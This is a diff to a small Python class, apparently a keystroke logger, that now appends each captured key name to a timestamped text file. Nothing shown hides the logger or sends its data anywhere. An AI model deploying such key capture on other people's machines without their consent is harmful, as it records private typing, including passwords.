@@ -4,16 +4,35 @@ import datetime
 
 class Texto:
     def __init__(self) -> None:
+        datetimeNow = datetime.datetime.now()
+
+        self.nomeDoArquivo = str(datetimeNow.day) + "-" + str(datetimeNow.month) + "-" + str(datetimeNow.year) + "__" + str(datetimeNow.hour) + "-" + str(datetimeNow.minute) + ".txt"
         self.texto = ""
         self.initialTime = time.time()
         self.lastKey = ""
         self.sameKeyCounter = 1
 
+        arquivo = open(self.nomeDoArquivo, "w")
+        arquivo.close()
         self.setHeader()
         return
     
     def setTexto(self, str):
-        self.texto += str
+        # conteudo
+        with open(self.nomeDoArquivo, 'r') as arquivoR:
+            conteudo = arquivoR.read()
+            print(conteudo)
+            arquivoR.close()
+
+        with open(self.nomeDoArquivo, 'w') as arquivoW:
+            arquivoW.write(conteudo + str)
+            arquivoW.close()
+
+        # arquivo = open(self.nomeDoArquivo, "w")
+        # conteudo = arquivo.read()
+
+        # self.texto += str
+            
         return
     
     def setHeader(self):
@@ -21,7 +40,7 @@ class Texto:
         dataStr = str(datetimeNow.day) + "/" + str(datetimeNow.month) + "/" + str(datetimeNow.year)
         horaStr = str(datetimeNow.hour) +":"+str(datetimeNow.minute)
         header = "\n\n --------- [" + str(dataStr) + "|" + str(horaStr) + "] ---------\n"
-        self.texto += header
+        self.setTexto(header)
     
     def onKeyPress(self, key):
         self.setTexto(self.treatChar(key.name))
@@ -65,6 +84,7 @@ class Texto:
     def resetTimer(self):
         self.timer = 0
         return
+    
             
     
 texto = Texto()
